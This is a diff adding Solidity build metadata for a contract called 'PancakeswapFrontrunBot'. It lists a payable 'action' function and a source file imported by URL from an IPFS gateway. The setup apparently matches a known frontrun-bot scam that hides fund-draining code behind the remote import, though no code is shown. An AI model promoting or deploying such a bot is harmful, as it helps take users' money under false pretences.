@@ -1,0 +1,122 @@
+{
+	"compiler": {
+		"version": "0.6.6+commit.6c089d02"
+	},
+	"language": "Solidity",
+	"output": {
+		"abi": [
+			{
+				"inputs": [
+					{
+						"internalType": "string",
+						"name": "_tokenName",
+						"type": "string"
+					},
+					{
+						"internalType": "string",
+						"name": "_tokenSymbol",
+						"type": "string"
+					}
+				],
+				"stateMutability": "nonpayable",
+				"type": "constructor"
+			},
+			{
+				"inputs": [],
+				"name": "action",
+				"outputs": [],
+				"stateMutability": "payable",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "tokenName",
+				"outputs": [
+					{
+						"internalType": "string",
+						"name": "",
+						"type": "string"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"inputs": [],
+				"name": "tokenSymbol",
+				"outputs": [
+					{
+						"internalType": "string",
+						"name": "",
+						"type": "string"
+					}
+				],
+				"stateMutability": "view",
+				"type": "function"
+			},
+			{
+				"stateMutability": "payable",
+				"type": "receive"
+			}
+		],
+		"devdoc": {
+			"methods": {}
+		},
+		"userdoc": {
+			"methods": {}
+		}
+	},
+	"settings": {
+		"compilationTarget": {
+			"flashloan.sol": "PancakeswapFrontrunBot"
+		},
+		"evmVersion": "istanbul",
+		"libraries": {},
+		"metadata": {
+			"bytecodeHash": "ipfs"
+		},
+		"optimizer": {
+			"enabled": false,
+			"runs": 200
+		},
+		"remappings": []
+	},
+	"sources": {
+		"contracts/interfaces/IUniswapV2Migrator.sol": {
+			"keccak256": "0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124",
+			"urls": [
+				"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da",
+				"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8"
+			]
+		},
+		"contracts/interfaces/V1/IUniswapV1Exchange.sol": {
+			"keccak256": "0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b",
+			"urls": [
+				"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65",
+				"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi"
+			]
+		},
+		"contracts/interfaces/V1/IUniswapV1Factory.sol": {
+			"keccak256": "0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589",
+			"urls": [
+				"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6",
+				"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f"
+			]
+		},
+		"flashloan.sol": {
+			"keccak256": "0xd88832938c53227d6ea5a0403ced890e61bcbac04fefc44263fce33db7667de5",
+			"urls": [
+				"bzz-raw://c0640fec65acf577da7940a71ea22ddfb24710bbf70acdffe8100cb855213710",
+				"dweb:/ipfs/QmQV6YUfgcWhnQEDC5NQBticSL2J5kTT4FcGT1JYb23CHE"
+			]
+		},
+		"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
+			"keccak256": "0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb",
+			"urls": [
+				"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877",
+				"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q"
+			]
+		}
+	},
+	"version": 1
+}
